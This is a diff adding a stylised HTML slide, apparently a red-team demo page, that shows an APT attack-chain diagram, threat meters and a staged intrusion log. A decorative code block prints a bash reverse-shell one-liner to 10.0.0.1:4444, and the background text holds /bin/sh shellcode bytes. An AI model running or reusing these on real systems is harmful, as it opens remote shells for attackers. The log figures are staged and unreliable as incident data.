@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<title>诡秘入侵</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+  html, body {
+    width: 1017px; height: 720px;
+    min-width: 1017px; max-width: 1017px;
+    min-height: 720px; max-height: 720px;
+    overflow: hidden;
+    background: #000;
+    font-family: 'Share Tech Mono', 'Courier New', monospace;
+    color: #00ff41;
+  }
+
+  /* 扫描线动画背景 */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,65,0.03) 2px,
+      rgba(0,255,65,0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 10;
+  }
+
+  /* 噪点叠层 */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: radial-gradient(ellipse at 20% 50%, rgba(0,255,65,0.05) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 20%, rgba(0,180,255,0.04) 0%, transparent 50%);
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  /* ── Header 72px ── */
+  .header {
+    width: 1017px; height: 72px;
+    background: linear-gradient(180deg, #001a00 0%, #000d00 100%);
+    border-bottom: 1px solid #00ff41;
+    display: flex; align-items: center;
+    padding: 0 32px;
+    position: relative;
+    overflow: hidden;
+  }
+  .header::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff41, #00ffcc, #00ff41, transparent);
+    box-shadow: 0 0 12px #00ff41;
+  }
+  .header-skull {
+    font-size: 28px; margin-right: 16px;
+    text-shadow: 0 0 20px #ff0033, 0 0 40px #ff0033;
+    color: #ff2244;
+  }
+  .header-title {
+    font-size: 22px; font-weight: bold; letter-spacing: 6px;
+    color: #00ff41;
+    text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
+  }
+  .header-subtitle {
+    margin-left: 20px; font-size: 11px;
+    color: #00cc33; letter-spacing: 2px;
+    text-shadow: 0 0 6px #00ff41;
+  }
+  .header-status {
+    margin-left: auto;
+    display: flex; gap: 16px; align-items: center;
+  }
+  .status-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #ff0033;
+    box-shadow: 0 0 8px #ff0033, 0 0 16px #ff0033;
+    animation: blink 1.2s infinite;
+  }
+  @keyframes blink {
+    0%,100% { opacity: 1; } 50% { opacity: 0.2; }
+  }
+  .status-text { font-size: 10px; color: #ff4466; letter-spacing: 2px; }
+  .header-time { font-size: 13px; color: #00cc33; letter-spacing: 1px; }
+
+  /* ── Content 580px ── */
+  .content {
+    width: 1017px; height: 580px;
+    background: #000500;
+    padding: 0 32px;
+    display: grid;
+    grid-template-columns: 380px 1fr;
+    grid-template-rows: 280px 280px;
+    gap: 12px;
+    padding-top: 16px;
+    padding-bottom: 4px;
+    position: relative;
+  }
+
+  /* 矩阵雨背景文字 */
+  .matrix-bg {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    opacity: 0.04;
+    font-size: 10px; color: #00ff41;
+    overflow: hidden;
+    line-height: 12px;
+    letter-spacing: 2px;
+    padding: 8px;
+    word-break: break-all;
+    pointer-events: none;
+  }
+
+  .card {
+    background: rgba(0,255,65,0.03);
+    border: 1px solid rgba(0,255,65,0.25);
+    border-radius: 2px;
+    padding: 14px 16px;
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff41, transparent);
+    box-shadow: 0 0 8px #00ff41;
+  }
+  .card-tag {
+    font-size: 9px; color: #006622; letter-spacing: 3px;
+    margin-bottom: 8px; text-transform: uppercase;
+  }
+  .card-title {
+    font-size: 14px; color: #00ff41; font-weight: bold;
+    letter-spacing: 2px; margin-bottom: 10px;
+    text-shadow: 0 0 8px #00ff41;
+  }
+
+  /* 入侵路径图 */
+  .card-main {
+    grid-column: 1; grid-row: 1 / 3;
+  }
+
+  /* 威胁指数 */
+  .threat-bars { margin-top: 6px; }
+  .threat-item { display: flex; align-items: center; margin-bottom: 7px; gap: 8px; }
+  .threat-label { font-size: 10px; color: #008822; width: 90px; flex-shrink: 0; }
+  .threat-track { flex: 1; height: 6px; background: rgba(0,255,65,0.1); border-radius: 0; position: relative; }
+  .threat-fill { height: 100%; border-radius: 0; }
+  .threat-val { font-size: 10px; color: #00ff41; width: 36px; text-align: right; flex-shrink: 0; }
+
+  /* 日志流 */
+  .log-stream {
+    font-size: 10px; color: #007722; line-height: 1.7;
+    overflow: hidden; height: 120px;
+  }
+  .log-line { display: flex; gap: 8px; }
+  .log-time { color: #005511; flex-shrink: 0; }
+  .log-level { flex-shrink: 0; }
+  .log-level.err { color: #ff3333; }
+  .log-level.warn { color: #ffaa00; }
+  .log-level.ok { color: #00ff41; }
+  .log-msg { color: #00aa33; }
+  .log-msg.hi { color: #ff2244; text-shadow: 0 0 4px #ff0033; }
+
+  /* 进度圆弧 */
+  .ring-wrap { display: flex; gap: 20px; margin-top: 10px; justify-content: center; }
+  .ring-item { text-align: center; }
+  .ring-label { font-size: 9px; color: #006622; margin-top: 4px; letter-spacing: 1px; }
+
+  /* 扫描雷达 */
+  .radar-container { display: flex; justify-content: center; align-items: center; height: 100%; }
+
+  /* 代码片段 */
+  .code-block {
+    background: rgba(0,255,65,0.02);
+    border-left: 2px solid #00ff41;
+    padding: 8px 12px;
+    font-size: 10px;
+    color: #00aa33;
+    line-height: 1.8;
+    margin-top: 8px;
+  }
+  .code-kw { color: #ff6699; }
+  .code-str { color: #ffcc00; }
+  .code-var { color: #00ffcc; }
+  .code-cmt { color: #005522; }
+
+  /* ── Summary 48px ── */
+  .summary {
+    width: 1017px; height: 48px;
+    background: linear-gradient(180deg, #001200 0%, #000800 100%);
+    border-top: 1px solid rgba(0,255,65,0.3);
+    display: flex; align-items: center;
+    padding: 0 32px;
+    gap: 32px;
+  }
+  .sum-item { display: flex; align-items: center; gap: 8px; }
+  .sum-label { font-size: 9px; color: #005511; letter-spacing: 2px; text-transform: uppercase; }
+  .sum-val { font-size: 14px; font-weight: bold; color: #00ff41; text-shadow: 0 0 6px #00ff41; }
+  .sum-val.red { color: #ff2244; text-shadow: 0 0 6px #ff0033; }
+  .sum-sep { width: 1px; height: 24px; background: rgba(0,255,65,0.2); }
+
+  /* ── Footer 20px ── */
+  .footer {
+    width: 1017px; height: 20px;
+    background: #000300;
+    border-top: 1px solid rgba(0,255,65,0.1);
+    display: flex; align-items: center;
+    padding: 0 32px;
+    justify-content: space-between;
+  }
+  .footer-left { font-size: 8px; color: #003311; letter-spacing: 2px; }
+  .footer-right { font-size: 8px; color: #003311; letter-spacing: 1px; }
+</style>
+</head>
+<body>
+
+<!-- Header 72px -->
+<div class="header">
+  <div class="header-skull">☠</div>
+  <div>
+    <div class="header-title">PHANTOM INTRUSION</div>
+    <div class="header-subtitle">// 诡秘入侵 · 高级持续性威胁分析</div>
+  </div>
+  <div class="header-status">
+    <div class="status-dot"></div>
+    <div class="status-text">BREACH DETECTED</div>
+    <div class="header-time">2026-03-13 &nbsp;03:47:22</div>
+  </div>
+</div>
+
+<!-- Content 580px -->
+<div class="content">
+
+  <!-- 矩阵背景 -->
+  <div class="matrix-bg">
+    01101000 01100001 01100011 01101011 00100000 01110100 01101000 01100101 00100000 01110000 01101100 01100001 01101110 01100101 01110100 00001010
+    SYSCALL 0x4d INJECT 0x9a ROOTKIT PAYLOAD BUFFER_OVERFLOW NOP_SLED 0x90909090 SHELLCODE ESCALATE PRIVILEGE ROOT ACCESS GRANTED EXFILTRATE
+    \x48\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+  </div>
+
+  <!-- Card: 攻击路径 (左侧全高) -->
+  <div class="card card-main">
+    <div class="card-tag">// ATTACK_VECTOR_MAP</div>
+    <div class="card-title">▶ 攻击渗透路径</div>
+
+    <!-- SVG攻击链路图 -->
+    <svg width="348" height="340" style="display:block;margin:0 auto;">
+      <defs>
+        <filter id="glow">
+          <feGaussianBlur stdDeviation="2" result="blur"/>
+          <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+        <marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L8,3 L0,6 Z" fill="#ff3344"/>
+        </marker>
+        <marker id="arrow-green" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+          <path d="M0,0 L8,3 L0,6 Z" fill="#00ff41"/>
+        </marker>
+      </defs>
+
+      <!-- 连接线 -->
+      <line x1="174" y1="38" x2="174" y2="68" stroke="#ff3344" stroke-width="1.5" marker-end="url(#arrow)" stroke-dasharray="4,3"/>
+      <line x1="174" y1="108" x2="60" y2="138" stroke="#ff3344" stroke-width="1.5" marker-end="url(#arrow)" stroke-dasharray="4,3"/>
+      <line x1="174" y1="108" x2="174" y2="138" stroke="#ff3344" stroke-width="1.5" marker-end="url(#arrow)" stroke-dasharray="4,3"/>
+      <line x1="174" y1="108" x2="290" y2="138" stroke="#ff3344" stroke-width="1.5" marker-end="url(#arrow)" stroke-dasharray="4,3"/>
+      <line x1="60" y1="168" x2="60" y2="198" stroke="#00ff41" stroke-width="1.5" marker-end="url(#arrow-green)" stroke-dasharray="4,3"/>
+      <line x1="174" y1="168" x2="174" y2="198" stroke="#00ff41" stroke-width="1.5" marker-end="url(#arrow-green)" stroke-dasharray="4,3"/>
+      <line x1="290" y1="168" x2="290" y2="198" stroke="#ffaa00" stroke-width="1.5" marker-end="url(#arrow-green)" stroke-dasharray="4,3"/>
+      <line x1="60" y1="228" x2="174" y2="258" stroke="#00ff41" stroke-width="1" marker-end="url(#arrow-green)" stroke-dasharray="3,3"/>
+      <line x1="174" y1="228" x2="174" y2="258" stroke="#00ff41" stroke-width="1" marker-end="url(#arrow-green)" stroke-dasharray="3,3"/>
+      <line x1="290" y1="228" x2="290" y2="258" stroke="#ffaa00" stroke-width="1" marker-end="url(#arrow-green)"/>
+      <line x1="174" y1="288" x2="174" y2="318" stroke="#00ffcc" stroke-width="1.5" marker-end="url(#arrow-green)"/>
+
+      <!-- 节点 0: 入口 -->
+      <rect x="124" y="12" width="100" height="26" rx="1" fill="rgba(255,0,50,0.15)" stroke="#ff2244" stroke-width="1.5" filter="url(#glow)"/>
+      <text x="174" y="29" text-anchor="middle" fill="#ff4466" font-size="10" font-family="monospace">PHISHING EMAIL</text>
+
+      <!-- 节点 1: 初始访问 -->
+      <rect x="124" y="68" width="100" height="40" rx="1" fill="rgba(255,50,0,0.12)" stroke="#ff6600" stroke-width="1"/>
+      <text x="174" y="83" text-anchor="middle" fill="#ff6622" font-size="9" font-family="monospace">INITIAL ACCESS</text>
+      <text x="174" y="97" text-anchor="middle" fill="#cc4400" font-size="8" font-family="monospace">CVE-2025-4821</text>
+
+      <!-- 节点 2a/b/c: 横向移动 -->
+      <rect x="10" y="138" width="100" height="30" rx="1" fill="rgba(0,255,65,0.08)" stroke="#00ff41" stroke-width="1"/>
+      <text x="60" y="157" text-anchor="middle" fill="#00cc33" font-size="9" font-family="monospace">LATERAL MOVE</text>
+
+      <rect x="124" y="138" width="100" height="30" rx="1" fill="rgba(0,255,65,0.08)" stroke="#00ff41" stroke-width="1"/>
+      <text x="174" y="157" text-anchor="middle" fill="#00cc33" font-size="9" font-family="monospace">PRIV ESCALATE</text>
+
+      <rect x="240" y="138" width="100" height="30" rx="1" fill="rgba(255,170,0,0.1)" stroke="#ffaa00" stroke-width="1"/>
+      <text x="290" y="157" text-anchor="middle" fill="#ffaa00" font-size="9" font-family="monospace">PERSISTENCE</text>
+
+      <!-- 节点 3: 植入 -->
+      <rect x="10" y="198" width="100" height="30" rx="1" fill="rgba(0,255,65,0.06)" stroke="#006622" stroke-width="1"/>
+      <text x="60" y="217" text-anchor="middle" fill="#008822" font-size="8" font-family="monospace">ROOTKIT DEPLOY</text>
+
+      <rect x="124" y="198" width="100" height="30" rx="1" fill="rgba(0,255,65,0.06)" stroke="#006622" stroke-width="1"/>
+      <text x="174" y="217" text-anchor="middle" fill="#008822" font-size="8" font-family="monospace">C2 CHANNEL</text>
+
+      <rect x="240" y="198" width="100" height="30" rx="1" fill="rgba(255,170,0,0.08)" stroke="#886600" stroke-width="1"/>
+      <text x="290" y="217" text-anchor="middle" fill="#886600" font-size="8" font-family="monospace">BACKDOOR</text>
+
+      <!-- 节点 4: 数据外泄 -->
+      <rect x="124" y="258" width="100" height="30" rx="1" fill="rgba(0,255,200,0.08)" stroke="#00ffcc" stroke-width="1" filter="url(#glow)"/>
+      <text x="174" y="277" text-anchor="middle" fill="#00ffcc" font-size="9" font-family="monospace">DATA EXFIL</text>
+
+      <rect x="240" y="258" width="100" height="30" rx="1" fill="rgba(255,170,0,0.06)" stroke="#554400" stroke-width="1"/>
+      <text x="290" y="277" text-anchor="middle" fill="#665500" font-size="8" font-family="monospace">COVER TRACKS</text>
+
+      <!-- 终点 -->
+      <rect x="104" y="318" width="140" height="22" rx="1" fill="rgba(255,0,50,0.2)" stroke="#ff0033" stroke-width="1.5" filter="url(#glow)"/>
+      <text x="174" y="333" text-anchor="middle" fill="#ff2244" font-size="10" font-family="monospace" font-weight="bold">MISSION COMPLETE</text>
+    </svg>
+  </div>
+
+  <!-- Card: 威胁指标 (右上) -->
+  <div class="card">
+    <div class="card-tag">// THREAT_INDICATORS</div>
+    <div class="card-title">▶ 威胁等级评估</div>
+    <div class="threat-bars">
+      <div class="threat-item">
+        <div class="threat-label">渗透深度</div>
+        <div class="threat-track">
+          <div class="threat-fill" style="width:94%;background:linear-gradient(90deg,#ff0033,#ff4466);box-shadow:0 0 6px #ff0033;"></div>
+        </div>
+        <div class="threat-val" style="color:#ff2244">94%</div>
+      </div>
+      <div class="threat-item">
+        <div class="threat-label">数据泄露量</div>
+        <div class="threat-track">
+          <div class="threat-fill" style="width:78%;background:linear-gradient(90deg,#ff6600,#ffaa00);box-shadow:0 0 6px #ff6600;"></div>
+        </div>
+        <div class="threat-val" style="color:#ffaa00">78%</div>
+      </div>
+      <div class="threat-item">
+        <div class="threat-label">隐蔽性评分</div>
+        <div class="threat-track">
+          <div class="threat-fill" style="width:88%;background:linear-gradient(90deg,#00cc33,#00ff41);box-shadow:0 0 6px #00ff41;"></div>
+        </div>
+        <div class="threat-val">88%</div>
+      </div>
+      <div class="threat-item">
+        <div class="threat-label">横向移动范围</div>
+        <div class="threat-track">
+          <div class="threat-fill" style="width:61%;background:linear-gradient(90deg,#0099ff,#00ccff);box-shadow:0 0 6px #0099ff;"></div>
+        </div>
+        <div class="threat-val" style="color:#00ccff">61%</div>
+      </div>
+      <div class="threat-item">
+        <div class="threat-label">持久化程度</div>
+        <div class="threat-track">
+          <div class="threat-fill" style="width:83%;background:linear-gradient(90deg,#cc00ff,#ff00cc);box-shadow:0 0 6px #cc00ff;"></div>
+        </div>
+        <div class="threat-val" style="color:#ff00cc">83%</div>
+      </div>
+      <div class="threat-item">
+        <div class="threat-label">C2通信频率</div>
+        <div class="threat-track">
+          <div class="threat-fill" style="width:72%;background:linear-gradient(90deg,#00ffcc,#00ff41);box-shadow:0 0 6px #00ffcc;"></div>
+        </div>
+        <div class="threat-val" style="color:#00ffcc">72%</div>
+      </div>
+    </div>
+
+    <!-- 代码片段 -->
+    <div class="code-block">
+      <span class="code-cmt"># payload.sh — 混淆执行链</span><br>
+      <span class="code-kw">exec</span> <span class="code-str">3&lt;&amp;1</span> <span class="code-var">$(</span>bash -i <span class="code-str">&gt;&amp; /dev/tcp/</span><br>
+      &nbsp;&nbsp;<span class="code-var">10.0.0.1</span>/<span class="code-str">4444</span> <span class="code-str">0&gt;&amp;1</span><span class="code-var">)</span>
+    </div>
+  </div>
+
+  <!-- Card: 实时日志 (右下) -->
+  <div class="card">
+    <div class="card-tag">// REALTIME_LOG_STREAM</div>
+    <div class="card-title">▶ 入侵事件日志</div>
+    <div class="log-stream">
+      <div class="log-line"><span class="log-time">03:41:02</span><span class="log-level ok">[OK]&nbsp;</span><span class="log-msg">SMTP relay exploited · user@corp.internal phished</span></div>
+      <div class="log-line"><span class="log-time">03:41:38</span><span class="log-level warn">[WRN]</span><span class="log-msg">Antivirus signature bypass via polymorphic code</span></div>
+      <div class="log-line"><span class="log-time">03:42:11</span><span class="log-level ok">[OK]&nbsp;</span><span class="log-msg">Meterpreter session opened on 192.168.1.47:4444</span></div>
+      <div class="log-line"><span class="log-time">03:43:05</span><span class="log-level err">[ERR]</span><span class="log-msg hi">EDR detection triggered — activating cloak mode</span></div>
+      <div class="log-line"><span class="log-time">03:43:22</span><span class="log-level ok">[OK]&nbsp;</span><span class="log-msg">Token impersonation: NT AUTHORITY\SYSTEM acquired</span></div>
+      <div class="log-line"><span class="log-time">03:44:58</span><span class="log-level ok">[OK]&nbsp;</span><span class="log-msg">Pass-the-Hash successful → DC01.corp.internal</span></div>
+      <div class="log-line"><span class="log-time">03:45:33</span><span class="log-level warn">[WRN]</span><span class="log-msg">Exfil channel: DNS tunneling via TXT records</span></div>
+      <div class="log-line"><span class="log-time">03:46:44</span><span class="log-level err">[ERR]</span><span class="log-msg hi">CRITICAL: 4.7GB classified data streamed to C2</span></div>
+      <div class="log-line"><span class="log-time">03:47:08</span><span class="log-level ok">[OK]&nbsp;</span><span class="log-msg">Rootkit planted · persistence established in MBR</span></div>
+      <div class="log-line"><span class="log-time">03:47:21</span><span class="log-level ok">[OK]&nbsp;</span><span class="log-msg" style="color:#ff2244;text-shadow:0 0 4px #ff0033">PHASE 4: COVER TRACKS → /var/log/* wiped ████</span></div>
+    </div>
+
+    <!-- 进度圆环 -->
+    <div class="ring-wrap">
+      <div class="ring-item">
+        <svg width="56" height="56">
+          <circle cx="28" cy="28" r="22" fill="none" stroke="rgba(0,255,65,0.1)" stroke-width="4"/>
+          <circle cx="28" cy="28" r="22" fill="none" stroke="#ff2244" stroke-width="4"
+            stroke-dasharray="138 138" stroke-dashoffset="8" stroke-linecap="round"
+            transform="rotate(-90 28 28)" filter="url(#glow)"/>
+          <text x="28" y="33" text-anchor="middle" fill="#ff2244" font-size="11" font-family="monospace">94%</text>
+        </svg>
+        <div class="ring-label">渗透</div>
+      </div>
+      <div class="ring-item">
+        <svg width="56" height="56">
+          <circle cx="28" cy="28" r="22" fill="none" stroke="rgba(0,255,65,0.1)" stroke-width="4"/>
+          <circle cx="28" cy="28" r="22" fill="none" stroke="#00ffcc" stroke-width="4"
+            stroke-dasharray="108 30" stroke-dashoffset="0"
+            transform="rotate(-90 28 28)" filter="url(#glow)"/>
+          <text x="28" y="33" text-anchor="middle" fill="#00ffcc" font-size="11" font-family="monospace">78%</text>
+        </svg>
+        <div class="ring-label">泄露</div>
+      </div>
+      <div class="ring-item">
+        <svg width="56" height="56">
+          <circle cx="28" cy="28" r="22" fill="none" stroke="rgba(0,255,65,0.1)" stroke-width="4"/>
+          <circle cx="28" cy="28" r="22" fill="none" stroke="#ffaa00" stroke-width="4"
+            stroke-dasharray="122 16" stroke-dashoffset="0"
+            transform="rotate(-90 28 28)" filter="url(#glow)"/>
+          <text x="28" y="33" text-anchor="middle" fill="#ffaa00" font-size="11" font-family="monospace">88%</text>
+        </svg>
+        <div class="ring-label">隐蔽</div>
+      </div>
+      <div class="ring-item">
+        <svg width="56" height="56">
+          <circle cx="28" cy="28" r="22" fill="none" stroke="rgba(0,255,65,0.1)" stroke-width="4"/>
+          <circle cx="28" cy="28" r="22" fill="none" stroke="#cc00ff" stroke-width="4"
+            stroke-dasharray="84 54" stroke-dashoffset="0"
+            transform="rotate(-90 28 28)" filter="url(#glow)"/>
+          <text x="28" y="33" text-anchor="middle" fill="#cc00ff" font-size="11" font-family="monospace">61%</text>
+        </svg>
+        <div class="ring-label">扩散</div>
+      </div>
+      <div class="ring-item">
+        <svg width="56" height="56">
+          <circle cx="28" cy="28" r="22" fill="none" stroke="rgba(0,255,65,0.1)" stroke-width="4"/>
+          <circle cx="28" cy="28" r="22" fill="none" stroke="#0099ff" stroke-width="4"
+            stroke-dasharray="115 23" stroke-dashoffset="0"
+            transform="rotate(-90 28 28)"/>
+          <text x="28" y="33" text-anchor="middle" fill="#0099ff" font-size="11" font-family="monospace">83%</text>
+        </svg>
+        <div class="ring-label">持久</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Summary 48px -->
+<div class="summary">
+  <div class="sum-item">
+    <div class="sum-label">受感染主机</div>
+    <div class="sum-val red">247</div>
+  </div>
+  <div class="sum-sep"></div>
+  <div class="sum-item">
+    <div class="sum-label">泄露数据量</div>
+    <div class="sum-val red">4.7 GB</div>
+  </div>
+  <div class="sum-sep"></div>
+  <div class="sum-item">
+    <div class="sum-label">攻击持续时间</div>
+    <div class="sum-val">00:06:19</div>
+  </div>
+  <div class="sum-sep"></div>
+  <div class="sum-item">
+    <div class="sum-label">检测规避率</div>
+    <div class="sum-val">96.3%</div>
+  </div>
+  <div class="sum-sep"></div>
+  <div class="sum-item">
+    <div class="sum-label">威胁等级</div>
+    <div class="sum-val red">CRITICAL · APT-29</div>
+  </div>
+  <div style="margin-left:auto;font-size:9px;color:#003311;letter-spacing:2px;">
+    ▐█▌ PHANTOM INTRUSION ANALYSIS SYSTEM v4.1.0 ▐█▌
+  </div>
+</div>
+
+<!-- Footer 20px -->
+<div class="footer">
+  <div class="footer-left">CONFIDENTIAL · RED TEAM ASSESSMENT · TLP:RED</div>
+  <div class="footer-right">PHANTOM_INTRUSION_DEMO · PAGE 01 / 06</div>
+</div>
+
+</body>
+</html>
